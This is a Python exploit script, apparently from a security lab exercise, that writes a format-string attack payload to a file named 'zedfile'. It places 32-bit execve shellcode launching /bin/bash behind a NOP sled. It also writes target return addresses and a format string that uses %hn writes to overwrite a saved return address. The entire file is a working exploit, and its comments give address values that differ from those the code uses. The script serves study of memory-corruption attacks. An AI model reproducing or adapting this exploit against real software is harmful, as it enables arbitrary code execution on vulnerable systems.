#!/usr/bin/python3
from distutils.command.build import build
import re
import sys

# 32-bit Generic Shellcode 
shellcode_32 = (
   "\xeb\x29\x5b\x31\xc0\x88\x43\x09\x88\x43\x0c\x88\x43\x47\x89\x5b"
   "\x48\x8d\x4b\x0a\x89\x4b\x4c\x8d\x4b\x0d\x89\x4b\x50\x89\x43\x54"
   "\x8d\x4b\x48\x31\xd2\x31\xc0\xb0\x0b\xcd\x80\xe8\xd2\xff\xff\xff"
   "/bin/bash*"
   "-c*"
   # The * in this line serves as the position marker         *
   "/bin/ls -l; echo '===== Success! ======'                  *"
   "AAAA"   # Placeholder for argv[0] --> "/bin/bash"
   "BBBB"   # Placeholder for argv[1] --> "-c"
   "CCCC"   # Placeholder for argv[2] --> the command string
   "DDDD"   # Placeholder for argv[3] --> NULL
).encode('latin-1')

N = 1500
# Fill the content with NOP's
content = bytearray(0x90 for i in range(N))
# Put the code at the end
start = N - len(shellcode_32)
content[start:] = shellcode_32

# The Return Address = Frame pointer + 4
# Frame pointer = 0xffffd428
# Return Address = 0xFFFFD42C
# Input Buffer address = 0xffffd500
# Estimated start of NOP Sled = 0xffffd500 + 144 = 0xFFFFD644

ret_addr = 0xffffd118 + 4
print(hex(ret_addr))
str_addr = 0xffffd1f0 + 276  # the length of format string <= 100, it will jump to a NOP then to malicious code
content[:4] = (ret_addr).to_bytes(4, byteorder='little')
content[4:8] = ("@@@@").encode('latin-1')
content[8:12] = (ret_addr + 2).to_bytes(4, byteorder='little')
higher, lower = divmod(str_addr, 0x10000)
lower = (lower - 8) % (0x10000)
higher = (higher - lower - 8) % (0x10000)
s = "%.8x"*63 + "%." + str(lower) + "x" + "%hn" +"%." + str(higher) + "x" + "%hn"+"%.8x"
print(len(s.encode('utf-8')))
fmt = s.encode('latin-1')
content[12:12 + len(fmt)] = fmt

with open('zedfile', 'wb') as f:
  f.write(content)

# bu = 0xffffd7b0
# fp = 0xffffd6d8